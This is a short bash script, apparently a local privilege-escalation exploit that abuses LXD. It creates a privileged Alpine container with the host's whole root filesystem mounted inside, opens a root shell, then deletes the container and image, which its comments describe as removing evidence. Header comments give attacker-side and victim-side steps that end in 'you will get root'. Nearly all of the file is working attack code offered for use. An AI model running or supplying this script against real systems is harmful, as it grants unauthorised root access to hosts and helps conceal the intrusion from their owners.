#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

# shows user information for helping them
function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

#creates container
function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto #initaialises and creates lxd
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true # initialises alpine
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  # adds the user and gives them root access
  lxc start privesc # starts alpine
  lxc exec privesc sh # runs the container
  cleanup
}

# stops container and image from running and gets rid of evidence of it being there
function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [âˆš]"
}

# neither of these cannot be null
set -o nounset
set -o errexit

# takes parameters f is the file name and otherwise it does the help panel
declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

# if null then open help panel or creates container
if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
